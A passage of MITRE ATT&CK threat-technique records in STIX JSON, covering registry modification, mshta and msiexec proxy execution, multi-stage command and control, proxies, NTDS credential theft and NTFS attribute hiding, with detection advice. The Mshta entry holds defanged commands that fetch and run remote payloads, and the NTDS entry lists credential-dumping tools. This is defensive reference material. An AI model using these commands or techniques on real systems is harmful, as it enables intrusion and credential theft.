    "{\"created\":\"2017-05-31T21:30:34.928Z\",\"external_references\":[{\"external_id\":\"T1031\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1031\"},{\"external_id\":\"CAPEC-551\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/551.html\"},{\"description\":\"The Cyber (@r0wdy_). (2017, November 30). Service Recovery Parameters. Retrieved April 9, 2018.\",\"source_name\":\"Twitter Service Recovery Nov 2017\",\"url\":\"https://twitter.com/r0wdy_/status/936365549553991680\"},{\"description\":\"Microsoft. (2013, February 22). Set up Recovery Actions to Take Place When a Service Fails. Retrieved April 9, 2018.\",\"source_name\":\"Microsoft Service Recovery Feb 2013\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--62dfd1ca-52d5-483c-a84b-d6e80bf94b7b\",\"modified\":\"2020-03-16T16:05:53.825Z\",\"name\":\"Modify Existing Service\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2017-05-31T21:31:23.587Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\\n\\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\\n\\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\\n\\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system\'s [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\",\"external_references\":[{\"external_id\":\"T1112\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1112\"},{\"external_id\":\"CAPEC-203\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/203.html\"},{\"description\":\"Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.\",\"source_name\":\"Microsoft Reg\",\"url\":\"https://technet.microsoft.com/en-us/library/cc732643.aspx\"},{\"description\":\"Russinovich, M. & Sharkey, K. (2006, January 10). Reghide. Retrieved August 9, 2018.\",\"source_name\":\"Microsoft Reghide NOV 2006\",\"url\":\"https://docs.microsoft.com/sysinternals/downloads/reghide\"},{\"description\":\"Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018.\",\"source_name\":\"TrendMicro POWELIKS AUG 2014\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/\"},{\"description\":\"Reitz, B. (2017, July 14). Hiding Registry keys with PSReflect. Retrieved August 9, 2018.\",\"source_name\":\"SpectorOps Hiding Reg Jul 2017\",\"url\":\"https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353\"},{\"description\":\"Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.\",\"source_name\":\"Microsoft Remote\",\"url\":\"https://technet.microsoft.com/en-us/library/cc754820.aspx\"},{\"description\":\"Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018.\",\"source_name\":\"Microsoft 4657 APR 2017\",\"url\":\"https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657\"},{\"description\":\"Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018.\",\"source_name\":\"Microsoft RegDelNull July 2016\",\"url\":\"https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull\"}],\"id\":\"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T22:52:55.930Z\",\"name\":\"Modify Registry\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Bartosz Jerzman\",\"Travis Smith, Tripwire\",\"David Lu, Tripwire\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\"],\"x_mitre_detection\":\"Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\\n\\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\\n\\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1170\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1170\"},{\"description\":\"Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.\",\"source_name\":\"Wikipedia HTML Application\",\"url\":\"https://en.wikipedia.org/wiki/HTML_Application\"},{\"description\":\"Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.\",\"source_name\":\"MSDN HTML Applications\",\"url\":\"https://msdn.microsoft.com/library/ms536471.aspx\"},{\"description\":\"Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.\",\"source_name\":\"Cylance Dust Storm\",\"url\":\"https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf\"},{\"description\":\"McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.\",\"source_name\":\"Red Canary HTA Abuse Part Deux\",\"url\":\"https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/\"},{\"description\":\"Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.\",\"source_name\":\"FireEye Attacks Leveraging HTA\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html\"},{\"description\":\"Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.\",\"source_name\":\"Airbus Security Kovter Analysis\",\"url\":\"https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/\"},{\"description\":\"Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.\",\"source_name\":\"FireEye FIN7 April 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html\"},{\"description\":\"LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Mshta\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Mshta/\"}],\"id\":\"attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec\",\"modified\":\"2020-01-31T18:59:59.041Z\",\"name\":\"Mshta\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-23T19:32:49.557Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \\n\\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\\n\\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\\\"GetObject(\\\"\\\"script:https[:]//webserver/payload[.]sct\\\"\\\")\\\"))</code>\\n\\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\\n\\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer\'s security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)\",\"external_references\":[{\"external_id\":\"T1218.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/005\"},{\"description\":\"Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.\",\"source_name\":\"Cylance Dust Storm\",\"url\":\"https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf\"},{\"description\":\"McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.\",\"source_name\":\"Red Canary HTA Abuse Part Deux\",\"url\":\"https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/\"},{\"description\":\"Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.\",\"source_name\":\"FireEye Attacks Leveraging HTA\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html\"},{\"description\":\"Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.\",\"source_name\":\"Airbus Security Kovter Analysis\",\"url\":\"https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/\"},{\"description\":\"Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.\",\"source_name\":\"FireEye FIN7 April 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html\"},{\"description\":\"Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.\",\"source_name\":\"Wikipedia HTML Application\",\"url\":\"https://en.wikipedia.org/wiki/HTML_Application\"},{\"description\":\"Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.\",\"source_name\":\"MSDN HTML Applications\",\"url\":\"https://msdn.microsoft.com/library/ms536471.aspx\"},{\"description\":\"LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Mshta\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Mshta/\"}],\"id\":\"attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:35:27.613Z\",\"name\":\"Mshta\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank\",\"Ricardo Dias\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Digital Certificate Validation\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\\n\\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-24T14:38:49.266Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft.\\n\\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.\",\"external_references\":[{\"external_id\":\"T1218.007\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/007\"},{\"description\":\"Microsoft. (2017, October 15). msiexec. Retrieved January 24, 2020.\",\"source_name\":\"Microsoft msiexec\",\"url\":\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\"},{\"description\":\"LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.\",\"source_name\":\"LOLBAS Msiexec\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Msiexec/\"},{\"description\":\"Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.\",\"source_name\":\"TrendMicro Msiexec Feb 2018\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\"}],\"id\":\"attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:38:14.154Z\",\"name\":\"Msiexec\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"DLL monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Digital Certificate Validation\",\"Application control\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:15.935Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\\n\\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\\n\\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.\",\"external_references\":[{\"external_id\":\"T1104\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1104\"}],\"id\":\"attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2019-06-21T14:45:42.314Z\",\"name\":\"Multi-Stage Channels\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Netflow/Enclave netflow\",\"Network device logs\",\"Network protocol analysis\",\"Packet capture\",\"Process use of network\"],\"x_mitre_detection\":\"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.\",\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1188\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1188\"}],\"id\":\"attack-pattern--7d751199-05fa-4a72-920f-85df4506c76c\",\"modified\":\"2020-03-14T23:25:20.928Z\",\"name\":\"Multi-hop Proxy\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-14T23:23:41.770Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\",\"external_references\":[{\"external_id\":\"T1090.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1090/003\"}],\"id\":\"attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-14T23:23:41.770Z\",\"name\":\"Multi-hop Proxy\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network protocol analysis\",\"Netflow/Enclave netflow\"],\"x_mitre_detection\":\"When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:32.259Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated and should no longer be used.**\\n\\nSome adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.\",\"external_references\":[{\"external_id\":\"T1026\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1026\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--99709758-2b96-48f2-a68a-ad7fbd828091\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-30T13:59:11.272Z\",\"name\":\"Multiband Communication\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Netflow/Enclave netflow\",\"Process use of network\",\"Malware reverse engineering\",\"Process monitoring\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) Correlating alerts between multiple communication channels can further help identify command-and-control behavior.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:01.315Z\",\"external_references\":[{\"external_id\":\"T1079\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1079\"},{\"description\":\"Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.\",\"source_name\":\"SANS Decrypting SSL\",\"url\":\"http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840\"},{\"description\":\"Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.\",\"source_name\":\"SEI SSL Inspection Risks\",\"url\":\"https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html\"},{\"description\":\"Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016.\",\"source_name\":\"Fidelis DarkComet\",\"url\":\"https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--428ca9f8-0e33-442a-be87-f869cb4cf73e\",\"modified\":\"2020-03-24T14:09:11.589Z\",\"name\":\"Multilayer Encryption\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-11T18:42:35.572Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\\\NTDS\\\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\\n\\nIn addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\\n\\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\\n\\n* Volume Shadow Copy\\n* secretsdump.py\\n* Using the in-built Windows tool, ntdsutil.exe\\n* Invoke-NinjaCopy\\n\",\"external_references\":[{\"external_id\":\"T1003.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003/003\"},{\"description\":\"Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018.\",\"source_name\":\"Wikipedia Active Directory\",\"url\":\"https://en.wikipedia.org/wiki/Active_Directory\"},{\"description\":\"Metcalf, S. (2015, January 19). Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory Forest. Retrieved February 3, 2015.\",\"source_name\":\"Metcalf 2015\",\"url\":\"http://adsecurity.org/?p=1275\"}],\"id\":\"attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T20:39:39.949Z\",\"name\":\"NTDS\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ed Williams, Trustwave, SpiderLabs\"],\"x_mitre_data_sources\":[\"Windows event logs\",\"Process command-line parameters\",\"PowerShell logs\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Access to Domain Controller or backup\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:11.147Z\",\"external_references\":[{\"external_id\":\"T1096\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1096\"},{\"description\":\"Atkinson, J. (2017, July 18). Host-based Threat Modeling & Indicator Design. Retrieved March 21, 2018.\",\"source_name\":\"SpectorOps Host-Based Jul 2017\",\"url\":\"https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea\"},{\"description\":\"Hughes, J. (2010, August 25). NTFS File Attributes. Retrieved March 21, 2018.\",\"source_name\":\"Microsoft NTFS File Attributes Aug 2010\",\"url\":\"https://blogs.technet.microsoft.com/askcore/2010/08/25/ntfs-file-attributes/\"},{\"description\":\"Microsoft. (n.d.). File Streams. Retrieved December 2, 2014.\",\"source_name\":\"Microsoft File Streams\",\"url\":\"http://msdn.microsoft.com/en-us/library/aa364404\"},{\"description\":\"Arntz, P. (2015, July 22). Introduction to Alternate Data Streams. Retrieved March 21, 2018.\",\"source_name\":\"MalwareBytes ADS July 2015\",\"url\":\"https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/\"},{\"description\":\"Marlin, J. (2013, March 24). Alternate Data Streams in NTFS. Retrieved March 21, 2018.\",\"source_name\":\"Microsoft ADS Mar 2014\",\"url\":\"https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/\"},{\"description\":\"Harrell, C. (2012, December 11). Extracting ZeroAccess from NTFS Extended Attributes. Retrieved June 3, 2016.\",\"source_name\":\"Journey into IR ZeroAccess NTFS EA\",\"url\":\"http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html\"},{\"description\":\"Moe, O. (2018, January 14). Putting Data in Alternate Data Streams and How to Execute It. Retrieved June 30, 2018.\",\"source_name\":\"Oddvar Moe ADS1 Jan 2018\",\"url\":\"https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/\"},{\"description\":\"Moe, O. (2018, April 11). Putting Data in Alternate Data Streams and How to Execute It - Part 2. Retrieved June 30, 2018.\",\"source_name\":\"Oddvar Moe ADS2 Apr 2018\",\"url\":\"https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\"},{\"description\":\"Pravs. (2009, May 25). What you need to know about alternate data streams in windows? Is your Data secure? Can you restore that?. Retrieved March 21, 2018.\",\"source_name\":\"Symantec ADS May 2009\",\"url\":\"https://www.symantec.com/connect/articles/what-you-need-know-about-alternate-data-streams-windows-your-data-secure-can-you-restore\"}],\"id\":\"attack-pattern--f2d44246-91f1-478a-b6c8-1227e0ca109d\",\"modified\":\"2020-03-13T21:04:13.284Z\",\"name\":\"NTFS File Attributes\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-13T20:33:00.009Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\\n\\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)\",\"external_references\":[{\"external_id\":\"T1564.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1564/004\"},{\"description\":\"Atkinson, J. (2017, July 18). Host-based Threat Modeling & Indicator Design. Retrieved March 21, 2018.\",\"source_name\":\"SpectorOps Host-Based Jul 2017\",\"url\":\"https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea\"},{\"description\":\"Hughes, J. (2010, August 25). NTFS File Attributes. 